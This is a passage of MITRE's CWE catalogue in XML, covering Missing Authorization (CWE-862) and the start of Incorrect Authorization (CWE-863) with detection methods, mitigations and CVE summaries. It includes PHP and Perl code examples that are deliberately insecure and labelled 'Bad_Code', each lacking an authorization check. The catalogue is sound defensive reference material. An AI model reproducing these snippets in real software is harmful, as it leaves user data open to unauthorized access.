               <Reference_Link>http://www.whitehatsec.com/home/solutions/BL_auction.html</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>WASC</Reference_Author>
               <Reference_Title>Insufficient Process Validation</Reference_Title>
               <Reference_Link>http://projects.webappsec.org/w/page/13246943/Insufficient-Process-Validation</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>Rafal Los</Reference_Author>
               <Reference_Author>Prajakta Jagdale</Reference_Author>
               <Reference_Title>Defying Logic: Theory, Design, and Implementation of Complex
						Systems for Testing Application Logic</Reference_Title>
               <Reference_PubDate>2011</Reference_PubDate>
               <Reference_Link>http://www.slideshare.net/RafalLos/defying-logic-business-logic-testing-with-automation</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>Rafal Los</Reference_Author>
               <Reference_Title>Real-Life Example of a 'Business Logic Defect' (Screen
						Shots!)</Reference_Title>
               <Reference_PubDate>2011</Reference_PubDate>
               <Reference_Link>http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>Viktoria Felmetsger</Reference_Author>
               <Reference_Author>Ludovico Cavedon</Reference_Author>
               <Reference_Author>Christopher Kruegel</Reference_Author>
               <Reference_Author>Giovanni Vigna</Reference_Author>
               <Reference_Title>Toward Automated Detection of Logic Vulnerabilities in Web
						Applications</Reference_Title>
               <Reference_Publication>USENIX Security Symposium 2010</Reference_Publication>
               <Reference_PubDate>August 2010</Reference_PubDate>
               <Reference_Link>http://www.usenix.org/events/sec10/tech/full_papers/Felmetsger.pdf</Reference_Link>
            </Reference>
            <Reference>
               <Reference_Author>Faisal Nabi</Reference_Author>
               <Reference_Title>Designing a Framework Method for Secure Business Application
						Logic Integrity in e-Commerce Systems</Reference_Title>
               <Reference_Section>pages 29 - 41</Reference_Section>
               <Reference_Publication>International Journal of Network Security, Vol.12,
						No.1</Reference_Publication>
               <Reference_PubDate>2011</Reference_PubDate>
               <Reference_Link>http://ijns.femto.com.tw/contents/ijns-v12-n1/ijns-2011-v12-n1-p29-41.pdf</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Insufficient Process Validation</Mapped_Node_Name>
               <Mapped_Node_ID>40</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2011-03-24</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples,
						Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="862" Name="Missing Authorization" Weakness_Abstraction="Class" Status="Incomplete">
         <Description>
            <Description_Summary>The software does not perform an authorization check when an
					actor attempts to access a resource or perform an action.</Description_Summary>
            <Extended_Description>
               <Text>Assuming a user with a given identity, authorization is the process of
						determining whether that user can access a given resource, based on the
						user's privileges and any permissions or other access-control specifications
						that apply to the resource.</Text>
               <Text>When access control checks are not applied, users are able to access data
						or perform actions that they should not be allowed to perform. This can lead
						to a wide range of problems, including information exposures, denial of
						service, and arbitrary code execution.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>285</Relationship_Target_ID>
               <!--Improper Authorization--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>813</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A4 - Insecure Direct Object References--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>817</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A8 - Failure to Restrict URL Access--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Technology_Classes>
               <Technology_Class Technology_Name="Web-Server" Prevalence="Often"/>
               <Technology_Class Technology_Name="Database-Server" Prevalence="Often"/>
            </Technology_Classes>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <Text>An access control list (ACL) represents who/what has permissions to a
						given object. Different operating systems implement (ACLs) in different
						ways. In UNIX, there are three types of permissions: read, write, and
						execute. Users are divided into three classes for file access: owner, group
						owner, and all other users where each class has a separate set of rights. In
						Windows NT, there are four basic types of permissions for files: "No
						access", "Read access", "Change access", and "Full control". Windows NT
						extends the concept of three types of users in UNIX to include a list of
						users and groups along with their associated permissions. A user can create
						an object (file) and assign specified permissions to that object.</Text>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Alternate_Term_Description>
                  <Text>"AuthZ" is typically used as an abbreviation of "authorization" within
							the web application security community. It is also distinct from
							"AuthC," which is an abbreviation of "authentication." The use of "Auth"
							as an abbreviation is discouraged, since it could be used for either
							authentication or authorization.</Text>
               </Alternate_Term_Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Modes_of_Introduction>
            <Mode_of_Introduction>
               <Text>A developer may introduce authorization weaknesses because of a lack of
						understanding about the underlying technologies. For example, a developer
						may assume that attackers cannot modify certain inputs such as headers or
						cookies.</Text>
            </Mode_of_Introduction>
            <Mode_of_Introduction>
               <Text>Authorization weaknesses may arise when a single-user application is
						ported to a multi-user environment.</Text>
            </Mode_of_Introduction>
         </Modes_of_Introduction>
         <Likelihood_of_Exploit>High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read files or
						directories</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could read sensitive data, either by reading the data
							directly from a data store that is not restricted, or by accessing
							insufficiently-protected, privileged functionality to read the
							data.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify files or
						directories</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could modify sensitive data, either by writing the data
							directly to a data store that is not restricted, or by accessing
							insufficiently-protected, privileged functionality to write the
							data.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could gain privileges by modifying or reading critical
							data directly, or by accessing privileged functionality.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated static analysis is useful for detecting commonly-used idioms
							for authorization. A tool may be able to analyze related configuration
							files, such as .htaccess in Apache web servers, or detect the usage of
							commonly-used authorization libraries.</Text>
                  <Text>Generally, automated static analysis tools have difficulty detecting
							custom authorization schemes. In addition, the software's design may
							include some functionality that is accessible to any user and does not
							require an authorization check; an automated technique that detects the
							absence of authorization may report false positives.</Text>
               </Method_Description>
               <Method_Effectiveness>Limited</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated dynamic analysis may find many or all possible interfaces
							that do not require authorization, but manual analysis is required to
							determine if the lack of authorization violates business logic.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
                  <Text>Specifically, manual static analysis is useful for evaluating the
							correctness of custom authorization mechanisms.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules. However, manual efforts might not achieve desired code
							coverage within limited time constraints.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Host Application Interface Scanner</Text>
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Divide the software into anonymous, normal, privileged, and
							administrative areas. Reduce the attack surface by carefully mapping
							roles with data and functionality. Use role-based access control (RBAC)
							[R.862.1] to enforce the roles at the appropriate boundaries.</Text>
                  <Text>Note that this approach may not protect against horizontal
							authorization, i.e., it will not protect a user from attacking others
							with the same role.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that access control checks are performed related to the
							business logic. These checks may be different than the access control
							checks that are applied to more generic resources such as files,
							connections, processes, memory, and database records. For example, a
							database may restrict access for medical records to a specific database
							user, but each record might only be intended to be accessible to the
							patient and the patient's doctor [R.862.2].</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>For example, consider using authorization frameworks such as the JAAS
							Authorization Framework [R.862.5] and the OWASP ESAPI Access Control
							feature [R.862.4].</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For web applications, make sure that the access control mechanism is
							enforced correctly at the server side on every page. Users should not be
							able to access any unauthorized functionality or information by simply
							requesting direct access to that page.</Text>
                  <Text>One way to do this is to ensure that all pages containing sensitive
							information are not cached, and that all such pages restrict access to
							requests that are accompanied by an active and authenticated session
							token associated with a user who has the required permissions to access
							that page.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>System Configuration</Mitigation_Phase>
               <Mitigation_Phase>Installation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use the access control capabilities of your operating system and
							server environment and define your access control lists accordingly. Use
							a "default deny" policy when defining these ACLs.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-95">
               <Intro_Text>This function runs an arbitrary SQL query on a given database,
						returning the result of the query.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> function runEmployeeQuery($dbName, $name){</Code>
                     <Block>
                        <Code> mysql_select_db($dbName,$globalDbHandle) or die("Could not
									open Database".$dbName);</Code>
                        <Comment> //Use a prepared statement to avoid CWE-89</Comment>
                        <Code> $preparedStatement = $globalDbHandle-&gt;prepare('SELECT
									* FROM employees WHERE name = :name');</Code>
                        <Code> $preparedStatement-&gt;execute(array(':name' =&gt;
									$name));</Code>
                        <Code> return $preparedStatement-&gt;fetchAll();</Code>
                     </Block>
                     <Code>}</Code>
                     <Comment>/.../</Comment>
                     <Code>$employeeRecord =
								runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</Code>
                  </Block>
                  <Text>While this code is careful to avoid SQL Injection, the function does
							not confirm the user sending the query is authorized to do so. An
							attacker may be able to obtain sensitive employee information from the
							database.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-96">
               <Intro_Text>The following program could be part of a bulletin board system that
						allows users to send private messages to each other. This program intends to
						authenticate the user before deciding whether a private message should be
						displayed. Assume that LookupMessageObject() ensures that the $id argument
						is numeric, constructs a filename based on that id, and reads the message
						details from that file. Also assume that the program stores all private
						messages for all users in the same directory.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>sub DisplayPrivateMessage {</Code>
                     <Block>
                        <Code>my($id) = @_;</Code>
                        <Code>my $Message = LookupMessageObject($id);</Code>
                        <Code>print "From: " . encodeHTML($Message-&gt;{from}) .
									"&lt;br&gt;\n";</Code>
                        <Code>print "Subject: " . encodeHTML($Message-&gt;{subject}) .
									"\n";</Code>
                        <Code>print "&lt;hr&gt;\n";</Code>
                        <Code>print "Body: " . encodeHTML($Message-&gt;{body}) .
									"\n";</Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>my $q = new CGI;</Code>
                     <Comment># For purposes of this example, assume that CWE-309
								and</Comment>
                     <Comment># CWE-523 do not apply.</Comment>
                     <Code>if (! AuthenticateUser($q-&gt;param('username'),
								$q-&gt;param('password'))) {</Code>
                     <Block>
                        <Code>ExitError("invalid username or password");</Code>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>my $id = $q-&gt;param('id');</Code>
                     <Code>DisplayPrivateMessage($id);</Code>
                  </Block>
                  <Text>While the program properly exits if authentication fails, it does not
							ensure that the message is addressed to the user. As a result, an
							authenticated attacker could provide any arbitrary identifier and read
							private messages that were intended for other users.</Text>
                  <Text>One way to avoid this problem would be to ensure that the "to" field
							in the message object matches the username of the authenticated user.
						</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3168</Observed_Example_Reference>
               <Observed_Example_Description>Web application does not restrict access to admin
						scripts, allowing authenticated users to reset administrative
						passwords.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3597</Observed_Example_Reference>
               <Observed_Example_Description>Web application stores database file under the web
						root with insufficient access control (CWE-219), allowing direct
						request.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2282</Observed_Example_Reference>
               <Observed_Example_Description>Terminal server does not check authorization for
						guest access.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5027</Observed_Example_Reference>
               <Observed_Example_Description>System monitoring software allows users to bypass
						authorization by creating custom forms.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3781</Observed_Example_Reference>
               <Observed_Example_Description>Content management system does not check access
						permissions for private files, allowing others to view those
						files.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-6548</Observed_Example_Reference>
               <Observed_Example_Description>Product does not check the ACL of a page accessed
						using an "include" directive, allowing attackers to read unauthorized
						files.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2960</Observed_Example_Reference>
               <Observed_Example_Description>Web application does not restrict access to admin
						scripts, allowing authenticated users to modify passwords of other
						users.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-3230</Observed_Example_Reference>
               <Observed_Example_Description>Database server does not use appropriate
						privileges for certain sensitive operations.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2213</Observed_Example_Reference>
               <Observed_Example_Description>Gateway uses default "Allow" configuration for its
						authorization settings.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0034</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product does not properly interpret a
						configuration option for a system group, allowing users to gain
						privileges.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-6123</Observed_Example_Reference>
               <Observed_Example_Description>Chain: SNMP product does not properly parse a
						configuration option for which hosts are allowed to connect, allowing
						unauthorized IP addresses to connect.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-7109</Observed_Example_Reference>
               <Observed_Example_Description>Chain: reliance on client-side security (CWE-602)
						allows attackers to bypass authorization using a custom
						client.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3424</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product does not properly handle wildcards
						in an authorization policy list, allowing unintended
						access.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4577</Observed_Example_Reference>
               <Observed_Example_Description>ACL-based protection mechanism treats negative
						access rights as if they are positive, allowing bypass of intended
						restrictions.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-2925</Observed_Example_Reference>
               <Observed_Example_Description>Default ACL list for a DNS server does not set
						certain ACLs, allowing unauthorized DNS
						queries.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-6679</Observed_Example_Reference>
               <Observed_Example_Description>Product relies on the X-Forwarded-For HTTP header
						for authorization, allowing unintended access by spoofing the
						header.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3623</Observed_Example_Reference>
               <Observed_Example_Description>OS kernel does not check for a certain privilege
						before setting ACLs for files.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2801</Observed_Example_Reference>
               <Observed_Example_Description>Chain: file-system code performs an incorrect
						comparison (CWE-697), preventing default ACLs from being properly
						applied.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-1155</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product does not properly check the result
						of a reverse DNS lookup because of operator precedence (CWE-783), allowing
						bypass of DNS-based access restrictions.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.862.1">
               <Reference_Author>NIST</Reference_Author>
               <Reference_Title>Role Based Access Control and Role Based
						Security</Reference_Title>
               <Reference_Link>http://csrc.nist.gov/groups/SNS/rbac/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.862.2">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 4, "Authorization" Page 114; Chapter 6, "Determining
						Appropriate Access Control" Page 171</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.862.3">
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 5 - Improper Access Control
						(Authorization)</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-04</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/04/top-25-series-rank-5-improper-access-control-authorization/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.862.4">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-23" Local_Reference_ID="R.862.5">
               <Reference_Author>Rahul Bhattacharjee</Reference_Author>
               <Reference_Title>Authentication using JAAS</Reference_Title>
               <Reference_Link>http://www.javaranch.com/journal/2008/04/authentication-using-JAAS.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.862.6">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 2, "Common Vulnerabilities of Authorization", Page
						39.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2011-05-24</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples,
						References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="863" Name="Incorrect Authorization" Weakness_Abstraction="Class" Status="Incomplete">
         <Description>
            <Description_Summary>The software performs an authorization check when an actor
					attempts to access a resource or perform an action, but it does not correctly
					perform the check. This allows attackers to bypass intended access
					restrictions.</Description_Summary>
            <Extended_Description>
               <Text>Assuming a user with a given identity, authorization is the process of
						determining whether that user can access a given resource, based on the
						user's privileges and any permissions or other access-control specifications
						that apply to the resource.</Text>
               <Text>When access control checks are incorrectly applied, users are able to
						access data or perform actions that they should not be allowed to perform.
						This can lead to a wide range of problems, including information exposures,
						denial of service, and arbitrary code execution.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>285</Relationship_Target_ID>
               <!--Improper Authorization--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>813</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A4 - Insecure Direct Object References--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>817</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A8 - Failure to Restrict URL Access--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
            <Technology_Classes>
               <Technology_Class Technology_Name="Web-Server" Prevalence="Often"/>
               <Technology_Class Technology_Name="Database-Server" Prevalence="Often"/>
            </Technology_Classes>
         </Applicable_Platforms>
